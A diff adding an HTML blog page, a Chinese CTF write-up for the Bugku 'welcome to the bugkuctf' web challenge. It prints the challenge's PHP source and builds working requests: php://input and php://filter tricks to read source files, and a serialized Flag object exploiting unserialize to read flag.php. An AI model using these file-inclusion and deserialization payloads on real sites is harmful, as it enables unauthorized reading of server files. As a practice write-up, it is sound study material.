@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>bugku welcome to the bugkuctf wp | chuddy&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="chuddy's Blog">
+  
+  <meta name="description" content="welcome to the  bugkuctf">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bugku welcome to the bugkuctf wp">
+<meta property="og:url" content="http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/index.html">
+<meta property="og:site_name" content="chuddy&#39;s Blog">
+<meta property="og:description" content="welcome to the  bugkuctf">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-05-08T16:24:24.305Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bugku welcome to the bugkuctf wp">
+<meta name="twitter:description" content="welcome to the  bugkuctf">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/pace.min.js"></script>
+  
+
+  
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">一个专注 WEB 安全的技术博客</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a href="/">
+                        <i class="fa fa-home"></i>
+                        <span>Home</span>
+                    </a>
+                    
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>
+                        <span>Archives</span>
+                    </a>
+                    
+                    <a href="/about">
+                        <i class="fa fa-user"></i>
+                        <span>About</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/images/logo.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                    <h2>
+                        一个专注 WEB 安全的技术博客
+                    </h2>
+                    
+                </div>
+                <div id="header-description">
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="chuddy" target="_blank" href="//chuddyli.github.io">
+                            <i class="fa fa-home fa-2x"></i></a>
+                    
+                        <a title="Github" target="_blank" href="//github.com/chuddyli">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main" class="body-wrap"><article id="post-bugku-welcome-to-the-bugkuctf-wp" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      bugku welcome to the bugkuctf wp
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2018-05-08
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <h3 id="welcome-to-the-bugkuctf"><a href="#welcome-to-the-bugkuctf" class="headerlink" title="welcome to the  bugkuctf"></a>welcome to the  bugkuctf</h3><a id="more"></a>
+<p>点击连接  之后查看源码  发现</p>
+<pre><code>you are not the number of bugku !   
+
+&lt;!--  
+$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+
+if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+ --&gt;  
+</code></pre><p>发现了需要get传递三个参数</p>
+<ul>
+<li>$_GET[‘txt’] === $user === “welcome to the bugkuctf”</li>
+<li>$file = hint.php</li>
+</ul>
+<p>就想到了 php伪协议 文件包含漏洞</p>
+<pre><code>GET /test1/index.php?
+txt=php://input
+&amp;file=php://filter/read=convert.base64-encode/resource=hint.php
+&amp;password=
+
+POST
+welcome to the bugkuctf
+</code></pre><p>可以读出来  hint.php</p>
+<pre><code>&lt;?php    
+    class Flag{
+    //flag.php        
+    public $file;        
+    public function __tostring(){ 
+        if(isset($this-&gt;file)){                
+            echo file_get_contents($this-&gt;file);      
+            echo &quot;&lt;br&gt;&quot;; 
+
+        return (&quot;good&quot;);          
+        }        
+    }    
+}
+?&gt;
+</code></pre><p>同理 也可以读出index.php的代码</p>
+<pre><code>&lt;?php    
+    $txt = $_GET[&quot;txt&quot;];    
+    $file = $_GET[&quot;file&quot;];    
+    $password = $_GET[&quot;password&quot;];        
+    if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){        
+        echo &quot;hello friend!&lt;br&gt;&quot;;        
+        if(preg_match(&quot;/flag/&quot;,$file)){     
+            echo &quot;?????????????????????flag???&quot;;          
+            exit();        
+        }else{            
+            include($file);             
+            $password = unserialize($password);            
+            echo $password;        
+        }    
+    }else{        
+        echo &quot;you are not the number of bugku ! &quot;;    
+    }        
+?&gt;        
+    &lt;!--    
+        $user = $_GET[&quot;txt&quot;];    
+        $file = $_GET[&quot;file&quot;];    
+        $pass = $_GET[&quot;password&quot;];        
+        if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){        
+        echo &quot;hello admin!&lt;br&gt;&quot;;        
+        include($file); //hint.php    
+    }else{        
+    echo &quot;you are not admin ! &quot;;    
+    }     --&gt;  
+</code></pre><ul>
+<li>hint.php 提示的flag.php 从index.php可以看到对关键词flag进行了preg_match 所以不能直接读出代码内容</li>
+<li>hint.php 定义的是一个类  注意到中间有一个__tostring方法， 这个函数就是把类当作字符串执行时会自动执行的一个函数。</li>
+<li>__tostring 方法执行时，将变量$file作为文件名输出文件内容，结合提示flag.php，猜测屏蔽的flag.php文件在此打开</li>
+<li>将hint.php中的Flag方法当做字符串执行时，会自动执行__tostring方法，只有echo，只能输出一个或多个字符串，所以构造password为Flag类型，其中的string变量flie=flag.php即可</li>
+</ul>
+<p>看到了代码中有</p>
+<pre><code>include($file);             
+$password = unserialize($password);            
+echo $password; 
+</code></pre><p>因此知道需要构造序列化对象payload为</p>
+<pre><code>GET /test1/index.php?txt=php://input
+&amp;file=hint.php
+&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 
+
+POST   welcome to the bugkuctf
+</code></pre><p>就可得到flag</p>
+
+            <div class="post-copyright">
+    <div class="content">
+        <p>最后更新： 2019年05月09日 00:24</p>
+        <p>原始链接： <a class="post-url" href="/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/" title="bugku welcome to the bugkuctf wp">http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/</a></p>
+        <footer>
+            <a href="http://yoursite.com">
+                <img src="/images/logo.png" alt="chuddy">
+                chuddy
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;">赏</a>
+</div>
+
+<div id="reward" class="post-modal reward-lay">
+    <a class="close" href="javascript:;" id="reward-close">×</a>
+    <span class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        请我吃糖~
+        <i class="icon icon-quote-right"></i>
+    </span>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/images/wechat_code.jpg" alt="打赏二维码">
+        </div>
+        <div class="reward-select">
+            
+            <label class="reward-select-item checked" data-id="wechat" data-wechat="/images/wechat_code.jpg">
+                <img class="reward-select-item-wechat" src="/images/wechat.png" alt="微信">
+            </label>
+            
+            
+            <label class="reward-select-item" data-id="alipay" data-alipay="/images/alipay_code.jpg">
+                <img class="reward-select-item-alipay" src="/images/alipay.png" alt="支付宝">
+            </label>
+            
+        </div>
+    </div>
+</div>
+
+
+        
+    </div>
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:;" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/&title=《bugku welcome to the bugkuctf wp》 — chuddy's Blog&pic=http://yoursite.comimages/logo.png" data-title="微博">
+              <i class="fa fa-weibo"></i>
+            </a>
+          </li>
+          <li>
+            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
+              <i class="fa fa-weixin"></i>
+            </a>
+          </li>
+          <li>
+            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/&title=《bugku welcome to the bugkuctf wp》 — chuddy's Blog&source=welcome to the  bugkuctf" data-title="QQ">
+              <i class="fa fa-qq"></i>
+            </a>
+          </li>
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/" data-title="Facebook">
+              <i class="fa fa-facebook"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《bugku welcome to the bugkuctf wp》 — chuddy's Blog&url=http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/&via=http://yoursite.com" data-title="Twitter">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/" data-title="Google+">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        </ul>
+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+  <li class="article-footer-tags">
+    <i class="fa fa-tags"></i>
+      
+    <a href="/tags/writeup/" class="color3">writeup</a>
+      
+  </li>
+
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+    <aside class="post-toc-pos post-toc-top" id="post-toc">
+        <nav class="post-toc-wrap">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#welcome-to-the-bugkuctf"><span class="post-toc-text">welcome to the  bugkuctf</span></a></li></ol>
+        </nav>
+    </aside>
+    
+
+<nav id="article-nav">
+  
+    <a href="/2018/09/08/文件泄露/" id="article-nav-newer" class="article-nav-link-wrap">
+
+      <span class="article-nav-title">
+        <i class="fa fa-hand-o-left" aria-hidden="true"></i>
+        
+          文件泄露
+        
+      </span>
+    </a>
+  
+  
+</nav>
+
+
+
+    
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+<p>
+    <span id="busuanzi_container_site_uv" style="display:none">
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+      <p>
+        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
+        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
+      &copy; 2019 chuddy<br>
+      </p>
+    </div>
+  </div>
+</footer>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  var mihoConfig = {
+      root: "http://yoursite.com",
+      animate: true,
+      isHome: false,
+      share: true,
+      reward: 1
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/web/">web</a><a class="category-link" href="/categories/writeup/">writeup</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web漏洞/" style="font-size: 15px;">web漏洞</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/安全工具/" style="font-size: 10px;">安全工具</a>
+        </div>
+    </div>
+    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">Menus</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a href="/">
+                    <i class="fa fa-home"></i><span>Home</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/archives">
+                    <i class="fa fa-archive"></i><span>Archives</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/about">
+                    <i class="fa fa-user"></i><span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">Tags</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web漏洞/" style="font-size: 15px;">web漏洞</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/安全工具/" style="font-size: 10px;">安全工具</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:;">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+
+  <script src="/js/pop-img.js"></script>
+  <script>
+     $(".article-entry p img").popImg();
+  </script>
+
+  </div>
+</body>
+</html>
